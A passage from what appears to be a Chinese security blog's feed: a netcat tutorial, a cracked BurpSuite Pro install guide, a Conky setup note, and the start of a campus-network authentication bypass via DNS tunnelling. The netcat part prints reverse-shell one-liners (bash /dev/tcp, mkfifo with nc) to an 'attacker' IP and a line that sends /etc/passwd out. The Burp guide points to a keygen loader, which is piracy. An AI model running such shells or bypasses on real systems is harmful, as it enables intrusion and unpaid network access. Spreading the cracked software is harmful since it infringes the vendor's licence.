-Fbqd -a rijndael-256 -m ecb &gt; passwd.txt</span></span><br></pre></td></tr></table></figure></li><li><p>发送端</p><figure class="highlight shell hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-meta">$</span><span class="hljs-bash"> mcrypt --flush -Fbq -a rijndael-256 -m ecb &lt; /etc/passwd | nc -nv 192.168.43.8 4444 -q 1</span></span><br><span class="line">Enter the passphrase (maximum of 512 characters)</span><br><span class="line">Connection to 192.168.43.8 4444 port [tcp/*] succeeded!</span><br><span class="line">Please use a combination of upper and lower case letters and numbers.</span><br><span class="line">Enter passphrase: 000000</span><br><span class="line">Enter passphrase: 000000</span><br></pre></td></tr></table></figure></li></ul><h2 id="流媒体服务"><a href="#流媒体服务" class="headerlink" title="流媒体服务"></a>流媒体服务</h2><ul><li><p>服务端</p><figure class="highlight bash hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ cat vlc.mp4 | nc -lp 4444</span><br></pre></td></tr></table></figure></li><li><p>客户端</p><figure class="highlight shell hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-meta">$</span><span class="hljs-bash"> nc -nv 192.168.43.218 4444 | mplayer -vo x11 -cache 3000 -</span></span><br></pre></td></tr></table></figure></li></ul><h2 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h2><figure class="highlight bash hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ nc -nvz 192.168.43.218 1-1024</span><br><span class="line">-z 端口扫描，无I/O输出模式</span><br></pre></td></tr></table></figure><figure class="highlight bash hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ nc -vnzu 192.168.43.218 1-1024</span><br><span class="line">-u 探测UDP流量，默认TCP</span><br></pre></td></tr></table></figure><h2 id="远程硬盘克隆"><a href="#远程硬盘克隆" class="headerlink" title="远程硬盘克隆"></a>远程硬盘克隆</h2><p>调用系统命令 <code>dd</code> 来完成硬盘的克隆，从被取证端的 <code>sda</code> 磁盘克隆至取证端的 <code>sda</code> 磁盘。</p><ul><li><p>取证端</p><figure class="highlight bash hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ nc -lp 4444 | dd of=/dev/sda</span><br></pre></td></tr></table></figure></li><li><p>被取证端</p><figure class="highlight bash hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ dd <span class="hljs-keyword">if</span>=/dev/sda | nc -nv 192.168.43.218 4444 -q 1</span><br></pre></td></tr></table></figure></li></ul><h2 id="远程控制"><a href="#远程控制" class="headerlink" title="远程控制"></a>远程控制</h2><h3 id="正向"><a href="#正向" class="headerlink" title="正向"></a>正向</h3><ul><li><p>被控制端</p><p>ubuntu 默认无 -e 参数；首先先修复nc，调出 -e 参数。</p><figure class="highlight bash hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ sudo rm /etc/alternatives/nc &amp;&amp; sudo ln -s /bin/nc.traditional /etc/alternatives/nc</span><br></pre></td></tr></table></figure><figure class="highlight shell hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-meta">$</span><span class="hljs-bash"> nc -lp 4444 -e /bin/bash</span></span><br></pre></td></tr></table></figure></li><li><p>控制端</p><figure class="highlight bash hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ nc -nv 192.168.43.218 4444</span><br></pre></td></tr></table></figure></li></ul><h3 id="反向"><a href="#反向" class="headerlink" title="反向"></a>反向</h3><ul><li><p>控制端</p><figure class="highlight bash hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ nc -lp 4444</span><br></pre></td></tr></table></figure></li><li><p>被控制端</p><figure class="highlight bash hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ nc -nv 192.168.43.8 4444 -e /bin/bash</span><br></pre></td></tr></table></figure></li></ul><h3 id="Shell-反弹"><a href="#Shell-反弹" class="headerlink" title="Shell 反弹"></a><font color="red">Shell 反弹</font></h3><p>实际渗透测试中，目标主机 nc 或可能没有、不支持 -e 参数；这时就需要以下方式：</p><ul><li><p>攻击者（192.168.1.108）</p><figure class="highlight shell hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-meta">$</span><span class="hljs-bash"> nc -lvvp 4444</span></span><br><span class="line"><span class="hljs-meta">#</span><span class="hljs-bash"> 两个参数 v 代表显示更详细的信息。</span></span><br></pre></td></tr></table></figure></li><li><p>目标主机</p><figure class="highlight shell hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-meta">$</span><span class="hljs-bash"> bash -i &gt;&amp; /dev/tcp/192.168.1.108/4444 0&gt;&amp;1</span></span><br></pre></td></tr></table></figure><p>命令解释：</p><figure class="highlight shell hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">bash -i          产生一个交互式shell。</span><br><span class="line"><span class="hljs-meta">&gt;</span><span class="hljs-bash">&amp;               将联合符号(&amp;)前后内容相结合重定(&gt;)向至后者。</span></span><br><span class="line">/dev/tcp/ip/port linux中所有内容(设备、网络等)都被抽象成一个文件的形式而存在，这里意思就是对socket网络连接的一个抽象。</span><br><span class="line"><span class="hljs-meta">0&gt;</span><span class="hljs-bash">&amp;1将标准输入和标准输出内容相结合，然后重定向至标准输出内容。</span></span><br><span class="line"> 0 标准输入</span><br><span class="line">   1 标准输出</span><br><span class="line"> 2 错误输出</span><br></pre></td></tr></table></figure><p>整条命令的意思就是：bash 产生一个本地交互 shell 主动发起与攻击者(192.168.1.108)4444端口建立连接，重定向 <strong>TCP</strong> 4444连接到攻击者主机上；且将标准输入与标准输出相结合再次重定向给标准输出。即输入与攻击者输入命令，且接受命令输出！！！（表达能力有限）</p><p><strong>或者：</strong></p><figure class="highlight shell hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-meta">$</span><span class="hljs-bash"> rm /tmp/reserve;mknod /tmp/reserve p;/bin/bash 0&lt;/tmp/reserve | nc 192.168.1.108 4444 1&gt;/tmp/reserve</span></span><br></pre></td></tr></table></figure><p>命令解释：</p><figure class="highlight bash hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mknod 创建管道</span><br><span class="line">p     创建一个FIFO，FIFO的意思即为先进先出(first-in,first-out)</span><br></pre></td></tr></table></figure></li></ul><p>  简单理解：首先先创建一个（先进先出）管道<code>reserve</code>，然后将一个本机交互shell重定向给管道<code>reserve</code>，再然后将输出通过 nc 重定向到攻击者那端，并且将 shell 执行结果重定向至管道<code>reserve</code>。</p><h2 id="NCAT"><a href="#NCAT" class="headerlink" title="NCAT"></a>NCAT</h2><p>NC 缺乏加密和身份验证的能力，营运而出一款支持加密的程序 NCAT；其包含于 NMAP 工具包中。</p><ul><li><p>被控制端</p><figure class="highlight bash hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ ncat -c bash --allow 192.168.43.8 -vnl 4444 --ssl</span><br></pre></td></tr></table></figure></li><li><p>控制端</p><figure class="highlight bash hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ ncat -nv 192.168.43.218 4444 --ssl</span><br></pre></td></tr></table></figure></li></ul><h2 id="…………"><a href="#…………" class="headerlink" title="…………"></a>…………</h2><h3 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h3><ul><li><a href="https://www.anquanke.com/post/id/87017" target="_blank" rel="noopener">linux各种一句话反弹shell总结 </a></li><li><a href="https://linux.cn/article-9314-1.html" target="_blank" rel="noopener">为什么应该在 Linux 上使用命名管道</a></li></ul>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;Feature&quot;&gt;&lt;a href=&quot;#Feature&quot; class=&quot;headerlink&quot; title=&quot;Feature&quot;&gt;&lt;/a&gt;Feature&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;网络工具中的瑞士军刀&lt;/li&gt;
&lt;li&gt;侦听模式、传输模式&lt;/li&gt;
&lt;li&gt;Telnet、获取Banner信息&lt;/li&gt;
&lt;li&gt;传输即时文本信息、文件、目录&lt;/li&gt;
&lt;li&gt;加密传输文件&lt;/li&gt;
&lt;li&gt;远程控制、木马&lt;/li&gt;
&lt;li&gt;加密所有流量&lt;/li&gt;
&lt;li&gt;远程克隆硬盘&lt;/li&gt;
&lt;li&gt;流媒体服务器&lt;/li&gt;
&lt;/ul&gt;
    
    </summary>
    
      <category term="Notes" scheme="https://fanqxu.com/categories/Notes/"/>
    
    
      <category term="nc" scheme="https://fanqxu.com/tags/nc/"/>
    
  </entry>
  
  <entry>
    <title>BurpSuite Pro v1.7.37安装指南</title>
    <link href="https://fanqxu.com/2019/04/12/burp-install/index.html"/>
    <id>https://fanqxu.com/2019/04/12/burp-install/index.html</id>
    <published>2019-04-12T04:59:36.000Z</published>
    <updated>2019-04-12T11:35:23.856Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>BurpSuite 是一款在 Web 渗透中不可或缺的工具；每一位 Web 渗透者都应该学会使用，这句话也一点不为过。本文就其 Pro 版本来作一个安装记录。</p><p>感谢某逆向大神做出的贡献👍。</p></blockquote><a id="more"></a><h2 id="Java-环境"><a href="#Java-环境" class="headerlink" title="Java 环境"></a>Java 环境</h2><p>Burpsuite 是一款使用 Java 编写的非开源工具，可以跨平台使用，但需要 Java 的环境；而且对开源的那个还不太友好，只得下载 Oracle 闭源的那个👎。而且得下载8那个版本，12那个又会对 Burp 有影响。</p><p><a href="https://www.oracle.com/technetwork/java/javase/downloads/jdk8-downloads-2133151.html" target="_blank" rel="noopener">官网 <strong>Java SE Development Kit 8u201</strong> 下载传送门</a></p><p><img src="http://ww1.sinaimg.cn/large/006V665tgy1g2028bbhebj30ml0e274y.jpg" alt="先点同意/Accept"></p><h3 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h3><p>离线下载下来后，解压至系统的相应目录。</p><figure class="highlight bash hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ sudo tar zxvf jdk-8u201-linux-x64.tar.gz -C /usr/<span class="hljs-built_in">local</span>/</span><br></pre></td></tr></table></figure><h3 id="环境变量"><a href="#环境变量" class="headerlink" title="环境变量"></a>环境变量</h3><p>编辑 Java 环境变量。</p><figure class="highlight bash hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ sudo vim /etc/profile</span><br></pre></td></tr></table></figure><p>添加至尾行：</p><figure class="highlight vim hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">export JAVA_HOME=/usr/local/jdk1.<span class="hljs-number">8.0</span>_201/</span><br><span class="line">export PATH=$JAVA_HOME/bin:$PATH</span><br></pre></td></tr></table></figure><p>之后建议重启系统，再开机就可以查看到版本了。</p><figure class="highlight bash hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ java -version</span><br><span class="line">java version <span class="hljs-string">"1.8.0_201"</span></span><br><span class="line">Java(TM) SE Runtime Environment (build 1.8.0_201-b09)</span><br><span class="line">Java HotSpot(TM) 64-Bit Server VM (build 25.201-b09, mixed mode)</span><br></pre></td></tr></table></figure><h2 id="Burpsuite"><a href="#Burpsuite" class="headerlink" title="Burpsuite"></a>Burpsuite</h2><p>首先先从我的百度网盘上下载到本地。</p><p>链接: <a href="https://pan.baidu.com/s/14I4dLIS7Fa8nBCN0aPnKoQ" target="_blank" rel="noopener">https://pan.baidu.com/s/14I4dLIS7Fa8nBCN0aPnKoQ</a> </p><p>提取码: vqhn</p><p>解压至相应位置：</p><figure class="highlight bash hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ unzip -d ~/burp/ Burp_Suite_Pro_v1.7.37_Loader_Keygen.zip</span><br></pre></td></tr></table></figure><h3 id="快速启动"><a href="#快速启动" class="headerlink" title="快速启动"></a>快速启动</h3><p>首先先不要运行，先做一个启动脚本。</p><p>创建启动脚本 startburp.sh：</p><figure class="highlight bash hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ vim ~/burp/startburp.sh</span><br><span class="line">java -Xbootclasspath/p:burp-loader-keygen.jar -jar burpsuite_pro_v1.7.37.jar</span><br></pre></td></tr></table></figure><p>赋予权限：</p><figure class="highlight bash hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ chmod +x ~/burp/startburp.sh</span><br></pre></td></tr></table></figure><h3 id="激活"><a href="#激活" class="headerlink" title="激活"></a>激活</h3><p>首先先使用脚本启动打开 Burp，然后使用命令打开注册机。</p><figure class="highlight bash hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="hljs-built_in">cd</span> burp/ &amp;&amp; ./startburp.sh</span><br><span class="line">$ java -jar ~/burp/burp-loader-keygen.jar</span><br></pre></td></tr></table></figure><p>首先先同意 Burp Suite Licence；然后如下图中所示，在注册机中第一个框 <strong>License Text</strong> 随意输入，再将 <strong>License</strong> 中的字符串复制至 Burp 中，点击 <strong>Next</strong> 。</p><p><img src="http://ww1.sinaimg.cn/large/006V665tgy1g2028b49u1j30s70k7q3q.jpg" alt=""></p><p>点击 <strong>Manual activation</strong>，</p><p><img src="http://ww1.sinaimg.cn/large/006V665tgy1g2028b3iqoj30sa0k9q3e.jpg" alt=""></p><p>将 Burp 中第二个框中的字符串复制至注册机中 <strong>Activation Request</strong>。</p><p><img src="http://ww1.sinaimg.cn/large/006V665tgy1g2028b62csj30s60ke757.jpg" alt=""></p><p>再次将注册机中 <strong>Activation Response</strong> 复制至 Burp，点击 <strong>Next</strong>。</p><p><img src="http://ww1.sinaimg.cn/large/006V665tgy1g2028b9uqej30s90k7dh3.jpg" alt=""></p><p>如下图，即代表成功！！！</p><p><img src="http://ww1.sinaimg.cn/large/006V665tgy1g2028b4qtjj30s90jxdgq.jpg" alt=""></p><h3 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h3><ul><li><a href="https://www.52pojie.cn/thread-691448-1-1.html" target="_blank" rel="noopener">https://www.52pojie.cn/thread-691448-1-1.html</a></li></ul>]]></content>
    
    <summary type="html">
    
      &lt;blockquote&gt;
&lt;p&gt;BurpSuite 是一款在 Web 渗透中不可或缺的工具；每一位 Web 渗透者都应该学会使用，这句话也一点不为过。本文就其 Pro 版本来作一个安装记录。&lt;/p&gt;
&lt;p&gt;感谢某逆向大神做出的贡献👍。&lt;/p&gt;
&lt;/blockquote&gt;
    
    </summary>
    
      <category term="Software" scheme="https://fanqxu.com/categories/Software/"/>
    
    
      <category term="Web" scheme="https://fanqxu.com/tags/Web/"/>
    
  </entry>
  
  <entry>
    <title>Ubuntu Conky 折腾笔记</title>
    <link href="https://fanqxu.com/2019/04/03/conky-ubuntu/index.html"/>
    <id>https://fanqxu.com/2019/04/03/conky-ubuntu/index.html</id>
    <published>2019-04-03T10:17:30.000Z</published>
    <updated>2019-04-26T14:17:30.830Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>Linux 系统属于开源软件，它并非开箱即用的商业产品（Windows，MacOS）。其桌面系统需要大量的定制、美化、优化，才能用起来舒畅顺滑；这也可能是无数初学者初试受挫，并最终放弃的主要原因。</p><footer><strong>来自一位敬佩的安全前辈</strong></footer></blockquote><a id="more"></a><p><strong>所以本文就 Ubuntu 桌面美化的一次折腾做一个小笔记。</strong></p><p>说到桌面美化，就得聊到动态监视器 <strong>Conky</strong>。</p><h2 id="Conky-是什么-What？"><a href="#Conky-是什么-What？" class="headerlink" title="Conky 是什么 | What？"></a>Conky 是什么 | What？</h2><ul><li><p>Github: </p><p><a href="https://github.com/brndnmtthws/conky" target="_blank" rel="noopener">https://github.com/brndnmtthws/conky</a></p></li><li><p>Youtube: </p><p><a href="https://www.youtube.com/watch?v=bHtpLEoRKmg&amp;t=19s" target="_blank" rel="noopener">https://www.youtube.com/watch?v=bHtpLEoRKmg&amp;t=19s</a></p></li></ul><p>其实，简单来说。<strong>Conky</strong> 是一款免费的<strong>轻量</strong>级系统监视器，可以在桌面上显示任何类型的信息。</p><h2 id="特征-Features"><a href="#特征-Features" class="headerlink" title="特征 | Features"></a>特征 | Features</h2><p>据官方说明 <del>我承认以下几段都是抄袭官方的，还有上面几段</del> ，其可显示300+个内置对象，包括支持：</p><ul><li>大量操作系统统计数据<ul><li>内核、运行时间、CPU使用、内存使用、磁盘使用、网络……</li></ul></li><li>内置 IMAP 和 POP3 </li><li>可使用内置的 Lua 支持或自己的脚本和程序进行扩展</li><li>内置 Imlib2 和 Cairo</li><li>支持 OS Linux、FreeBSD、OpenBSD、Solaris 和 macOS……<ul><li>不好意思，真没 Windows😝</li></ul></li><li>……</li></ul><p>可以以文本形式显示信息，也可使用简单的进度条和图形小部件以及不同的字体和颜色显示信息。（<font color="red">重点</font>）</p><h2 id="快速开始-Quickstart"><a href="#快速开始-Quickstart" class="headerlink" title="快速开始 | Quickstart"></a>快速开始 | Quickstart</h2><p>终于扯到正点上去了，以上貌似都是废话。</p><h3 id="安装-Install"><a href="#安装-Install" class="headerlink" title="安装 | Install"></a>安装 | Install</h3><p>介于我的是 Debian 系，直接使用 APT 包管理安装；其他发行版本自行解决吧，这又不是啥难事😎。</p><figure class="highlight bash hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ sudo apt install conky-all</span><br></pre></td></tr></table></figure><h3 id="配置-Configuration"><a href="#配置-Configuration" class="headerlink" title="配置 | Configuration"></a>配置 | Configuration</h3><p>其实，主要就是一份流弊的配置文件。</p><p>关于我的配置文件，其实是一名高中生（至此文撰写）<a href="https://github.com/9527tech" target="_blank" rel="noopener">@Lunatic</a> 在网上收集并修改的。他首先是先在其 Arch 上完美运行，之后发布至 Github <a href="https://github.com/9527tech/conkyrc" target="_blank" rel="noopener">个人仓库</a>。</p><p>由于他是 Arch，我使用他的配置文件并不能完美滴在我的系统上展现出来。</p><p>又过来很长一段时间，我又发现一位 Arch 用户<a href="https://github.com/AsucreYau" target="_blank" rel="noopener">@纤魂</a> 已将 <strong>Lunatic</strong> 的配置文件魔改滴很到位，将其安装方式改的更加的简单，一个脚本的事。</p><p>随后，我就将<strong>纤魂</strong>的那个关于配置文件的仓库 fork 到我的仓库下，并作出一些变动；擅自主张滴将 Arch Logo 删掉，并修改了启动脚本。为的是给更多 Linux 用户介绍出这一优秀、漂亮、炫酷的桌面监视器，希望有后来者可折腾出更流弊的配置文件。</p><ul><li>Lunatic<ul><li><a href="https://github.com/9527tech/conkyrc" target="_blank" rel="noopener">https://github.com/9527tech/conkyrc</a></li></ul></li><li>纤魂<ul><li><a href="https://github.com/AsucreYau/conkyrc" target="_blank" rel="noopener">https://github.com/AsucreYau/conkyrc</a></li></ul></li><li>本渣渣 Forked From <a href="https://github.com/AsucreYau/conkyrc" target="_blank" rel="noopener">AsucreYau/conkyrc</a><ul><li><a href="https://github.com/FanqXu/conkyrc" target="_blank" rel="noopener">https://github.com/FanqXu/conkyrc</a></li></ul></li></ul><p>如果你是 Ubuntu/Debian 用户，你可以试试将本渣渣的仓库克隆至本地；Arch 用户直接看他两的仓库吧；其他系的，如果使用的是 Gnome 桌面，也可试着来吧。</p><figure class="highlight bash hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ git <span class="hljs-built_in">clone</span> https://github.com/FanqXu/conkyrc.git</span><br></pre></td></tr></table></figure><p> 然后进入此目录开始执行安装脚本。</p><figure class="highlight bash hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="hljs-built_in">cd</span> conkyrc</span><br><span class="line">$ ./install.sh</span><br></pre></td></tr></table></figure><p>然后就 OK 了，如果不行就执行一条命令或者重新登录桌面。</p><figure class="highlight bash hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="hljs-built_in">source</span> ~/.xprofile</span><br></pre></td></tr></table></figure><p>关于启动脚本，以后每次开机后的5秒后开始启动 Conky 配置文件。</p><figure class="highlight bash hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">$ bat startconky.sh</span><br><span class="line">───────┬──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────</span><br><span class="line">       │ File: startconky.sh</span><br><span class="line">───────┼──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────</span><br><span class="line">   1   │ <span class="hljs-comment">#!/bin/bash</span></span><br><span class="line">   2   │ </span><br><span class="line">   3   │ killall conky</span><br><span class="line">   4   │ </span><br><span class="line">   5   │ <span class="hljs-comment"># time (in s) for the DE to start; use ~20 for Gnome or KDE, less for Xfce/LXDE etc</span></span><br><span class="line">   6   │ sleep 5</span><br><span class="line">   7   │ </span><br><span class="line">   8   │ <span class="hljs-comment"># the main conky with rings</span></span><br><span class="line">   9   │ conky -c ~/.config/conky/rings --daemonize --quiet --pause=7</span><br><span class="line">  10   │ </span><br><span class="line">  11   │ <span class="hljs-comment"># time for the main conky to start; needed so that the smaller ones draw above not below (probably can be lower, but we still have to wait 5s for the rings to avoid segfaults)</span></span><br><span class="line">  12   │ sleep 1</span><br><span class="line">  13   │ </span><br><span class="line">  14   │ conky -c ~/.config/conky/cpu --daemonize --quiet</span><br><span class="line">  15   │ conky -c ~/.config/conky/ram --daemonize --quiet</span><br><span class="line">  16   │ conky -c ~/.config/conky/network --daemonize --quiet</span><br><span class="line">  17   │ conky -c ~/.config/conky/disk --daemonize --quiet</span><br><span class="line">  18   │ conky -c ~/.config/conky/clock --daemonize --quiet</span><br><span class="line">───────┴───────────────────────────────────</span><br></pre></td></tr></table></figure><h2 id="截屏-Screenshot"><a href="#截屏-Screenshot" class="headerlink" title="截屏 | Screenshot"></a>截屏 | Screenshot</h2><p><img src="https://raw.githubusercontent.com/FanqXu/conkyrc/master/Screenshot.png" alt="😎😎Screenshot"></p><h2 id="最后-Finally"><a href="#最后-Finally" class="headerlink" title="最后 | Finally"></a>最后 | Finally</h2><p>说到底，此文貌似就是使用 CV 大法而来的😅。</p><p>也罢，希望能够见到更流弊的 Conky 桌面吧！！！</p><h3 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h3><ul><li><a href="https://mp.weixin.qq.com/s/powz0xIdV3wPfmaLCvcEiA" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/powz0x……</a></li><li><a href="https://github.com/brndnmtthws/conky" target="_blank" rel="noopener">https://github.com/brndnmtthws/conky</a></li><li><a href="https://github.com/9527tech/conkyrc" target="_blank" rel="noopener">https://github.com/9527tech/conkyrc</a></li><li><a href="https://github.com/AsucreYau/conkyrc" target="_blank" rel="noopener">https://github.com/AsucreYau/conkyrc</a></li><li><a href="https://github.com/FanqXu/conkyrc" target="_blank" rel="noopener">https://github.com/FanqXu/conkyrc</a></li></ul>]]></content>
    
    <summary type="html">
    
      &lt;blockquote&gt;&lt;p&gt;Linux 系统属于开源软件，它并非开箱即用的商业产品（Windows，MacOS）。其桌面系统需要大量的定制、美化、优化，才能用起来舒畅顺滑；这也可能是无数初学者初试受挫，并最终放弃的主要原因。&lt;/p&gt;
&lt;footer&gt;&lt;strong&gt;来自一位敬佩的安全前辈&lt;/strong&gt;&lt;/footer&gt;&lt;/blockquote&gt;
    
    </summary>
    
      <category term="不美化，怎开发" scheme="https://fanqxu.com/categories/%E4%B8%8D%E7%BE%8E%E5%8C%96%EF%BC%8C%E6%80%8E%E5%BC%80%E5%8F%91/"/>
    
    
      <category term="conky" scheme="https://fanqxu.com/tags/conky/"/>
    
  </entry>
  
  <entry>
    <title>Bypass 校园网认证</title>
    <link href="https://fanqxu.com/2019/03/20/Bypass-campusNet/index.html"/>
    <id>https://fanqxu.com/2019/03/20/Bypass-campusNet/index.html</id>
    <published>2019-03-20T12:53:36.000Z</published>
    <updated>2019-04-26T14:19:47.750Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p><strong><font color="red">郑重声明：</font></strong></p><font color="red">本文仅限于教育学习研究、技术学习，严🈲用于商务及非法等损害某企业的事情；如若产生任何法律纠纷问题，均与本人无干系！！！ </font></blockquote><p>本文在绝大数人眼里或许是篇福利文；在此文中我将介绍如何通过 DNS TUNNEL 的方式来绕过校园网认证，实现免认证<del>免费</del>上网；或许此招式并不是最优解，但对于绝大多数校园认证网确实能够成功实现。</p><a id="more"></a><p>怎么说呢？？？其实我早盯上了某网，这篇文章是早晚的事。😏</p><h2 id="场景分析-Scene-Analysis"><a href="#场景分析-Scene-Analysis" class="headerlink" title="场景分析 / Scene Analysis"></a>场景分析 / Scene Analysis</h2><h3 id="扯蛋篇"><a href="#扯蛋篇" class="headerlink" title="扯蛋篇"></a>扯蛋篇</h3><p>在某所高校中，存在一家网络运营商，主要面向毫无收入的学生们，为汝等提供日常上网冲浪。</p><p>其特点就是三字：<font color="red"><strong>贵</strong></font>、<font color="red"><strong>差</strong></font>、<font color="red"><strong>抠</strong></font>😒。每月79RMB的高昂费用；网络质量差，打游戏经常<code>460</code>；还特么只让三个设备使用，这点或许也可通过某种方式绕过。</p><p>没办法，我虽不用此校园网，但还是看不下去，遂有了本文的诞生。</p><h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h3><p>在这所高校的网络中，统一使用的是 WiFi 热点客户端认证方式；当连上 WiFi 后，本机会向 DHCP 服务器获取一个内网 IP；关于这个 IP 地址，起初还让我很是疑惑，没想到在资源如此匮乏的大天朝，此运营商还会分一个公网 IP 给俺；</p><p><img src="http://ww1.sinaimg.cn/large/006V665tgy1g19hjs2yj8j30tj0akwk1.jpg" alt="ip a"></p><p>后来才知道这是个保留地址，详见其 <a href="https://en.wikipedia.org/wiki/Reserved_IP_addresses" target="_blank" rel="noopener">维基百科</a> 。</p><table><thead><tr><th>Address block</th><th>Scope</th><th>Description</th></tr></thead><tbody><tr><td>100.64.0.0/10</td><td>私有网络</td><td><a href="https://en.wikipedia.org/wiki/IPv4_shared_address_space" target="_blank" rel="noopener">共享地址空间</a></td></tr></tbody></table><p>在未认证前还会弹出一个下载认证客户端软件的页面，这里所用到的恶心技术就是利用 HTTP 协议的缺陷，当我们访问一个 HTTP 的网站时，网关会对这个响应报文劫持篡改，给我们302重定向到一个指定的下载认证客户端页面。而当我们打开一个 HTTPS 是不可能被劫持的，但也不可能打开，443端口被限制了。</p><p><img src="http://ww1.sinaimg.cn/large/006V665tgy1g19hl1kyhaj30pa0h7ab7.jpg" alt=""></p><p>上图就是重定向后的客户端下载页面，让我匪夷所思的是最上面的那个位置本该是一个域名，为何是个公网 IP。既然没有使用域名，那何必需要 DNS，何不直接关闭53端口，为何让我如此这般有机可乘；实在让我百思不得其解🤔。</p><p>由下图可得知，DNS 53端口是开启的。</p><p><img src="http://ww1.sinaimg.cn/large/006V665tgy1g19hlc5x1cj30e508iwgj.jpg" alt="nslookup"></p><h3 id="原理简述"><a href="#原理简述" class="headerlink" title="原理简述"></a>原理简述</h3><p>原理其实很简单。由上述信息得知，校园网认证过程一般需要放行 DNS 和  DHCP 报文，也就是53和67/68端口。53端口既可以是 UDP，也可是 TCP；67/68端口走的是 UDP 传输协议。</p><p>本文着重点是 DNS 53端口，其实 UDP 67也可以绕过认证；但本文将围绕 DNS 53来实现绕过认证，不讨论后者。</p><p>而在这个53端口中，网关/防火墙如果不进行报文检查，那么就也将意味着，任何数据包都可以通过此端口传输；如果真的是这样的话，那就很简单了，直接 openVPN 架起，详见此文 <a href="http://zgao.top/2019/03/03/%E5%88%A9%E7%94%A8openvpn%E5%AE%9E%E7%8E%B0udp536768%E7%AB%AF%E5%8F%A3%E7%BB%95%E8%BF%87%E6%A0%A1%E5%9B%AD%E7%BD%91%E8%AE%A4%E8%AF%81%E4%B8%8A%E7%BD%91/" target="_blank" rel="noopener">利用openVPN实现udp53,67,68端口绕过校园网认证上网</a> 